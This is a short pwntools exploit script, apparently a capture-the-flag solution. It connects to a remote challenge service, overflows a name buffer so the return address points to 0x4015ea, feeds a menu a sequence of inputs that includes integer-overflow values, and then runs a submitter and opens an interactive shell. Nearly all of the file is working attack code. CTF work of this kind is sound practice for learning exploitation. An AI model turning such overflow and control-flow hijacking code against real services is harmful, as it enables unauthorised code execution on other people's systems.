from pwn import *
import base64

context.log_level = 'info'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
io = remote(HOST, int(PORT))
# from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'

# io = process("./challenge")

# gdb.attach(io, api=True, gdbscript=
# """
# set follow-fork-mode parent
# b *0x4015ea
# """)

# io.sendlineafter(b"Enter your name: ", flat({
#     0x38: 0x4015ea,
# }))

io.sendlineafter(b"Enter your name: ", b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa\xea\x15@\x00')

payload = b"""D
H
123
X
A
E
C
321
0
E
C
321
1
1
0
1
haha
haha
haha
haha
haha
E
1
0
n
n
E
1
2147483648
n
n
X
D
H
999
X
A
C
9999
-2147483648
E
0
X
N"""

io.sendline(payload)
ans = io.recvuntil(b"You've mastered the art of Multi-Level Model Marketing!")
io.sendline(b"./submitter")

io.interactive()